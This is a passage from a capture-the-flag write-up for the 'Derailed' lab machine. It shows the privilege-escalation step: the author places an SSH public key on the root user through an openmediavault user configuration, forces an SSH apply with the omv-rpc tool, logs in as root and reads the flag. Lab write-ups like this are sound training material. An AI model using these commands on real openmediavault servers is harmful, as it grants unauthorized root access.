[{"uuid": "30386ffe-014c-4970-b68b-b4a2fb0a6ec9", "name": "rails", "email": "", "disallowusermod": false, "sshpubkeys": {"sshpubkey": []}}, {"uuid": "e3f59fea-4be7-4695-b0d5-560f25072d4a", "name": "root", "email": "", "disallowusermod": false, "sshpubkeys": {"sshpubkey": ["---- BEGIN SSH2 PUBLIC KEY ----\nComment: \"3072-bit RSA, converted by openmediavault-webgui@derailed fr\"\nAAAAB3NzaC1yc2EAAAADAQABAAABgQDPsdfneMWLTAENR6cBfDLOh84rASxx8/EYM7X+mm\nLF9zmq0/kOfVqyg1Kcjdj0aJTXQas7i98u4EseF2xKZnaeQGrjk2YWrhDj8hTk7Gql0+lp\n+rlJMGigaq+YQ+oh4Vop510N+TAiq53mNZR2CEkZ/RB4k4P/9utUbofr14DhhDJ637LBoZ\nOj0TexCVyVotYjTSHFaZ8SRIQJ4/2Kwd25+hJXtcnWv6mMe39OOnFhB//9ZTdidR71Fyd3\nx1yMn8846MdWnuXNs/Kl7YzgnCAsmcW7XxsewmwCkHu7hn8RSrPeQAi8omsDQ+6BsOEMRg\nj38J+DZUZETlu+XlomhNecwNVrsam5ImSDVRLnt9ZcsKmQ8uKcynFrx79xJs2tUrETdTVG\naaGxH92GZTltF5FOpneJCxB5tczct8vSJnzyDJp/EgGeBrYD3h1APjErR4EK49lY4t0niz\n6yYrEq8p/a7sX8D2G/XvsegIfMte+2ng8J9YoSpiprtQseMiaFIHE=\n---- END SSH2 PUBLIC KEY ----"]}}]
```

and then we have to force ssh with omv-rpc tool :

```bash
openmediavault-webgui@derailed:/usr/sbin$ ./omv-rpc -u admin "config" "applyChanges" "{ \"modules\": [\"ssh\"],\"force\":true}"
null
openmediavault-webgui@derailed:/usr/sbin$ 
```


Now, we can easily SSH into the system using ```ssh root@derailed.htb```, and as a result, we have obtained a shell with ```root``` privileges!

```bash
openmediavault-webgui@derailed:/tmp$ ssh rooterailed
ssh: Could not resolve hostname rooterailed: Name or service not known
openmediavault-webgui@derailed:/tmp$ ssh root@derailed
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 21 06:29:50 2023 from 127.0.0.1
root@derailed:~# ls
google	meta  root.txt
root@derailed:~# cat root.txt 
797ea56d36caa4b3d53b************
```

***

Thanks for reading! if you have any questions or comments, feel free to contact me at emsecpro@gmail.com. 

Happy hacking! 👾❤️
see you guys  in another insane box
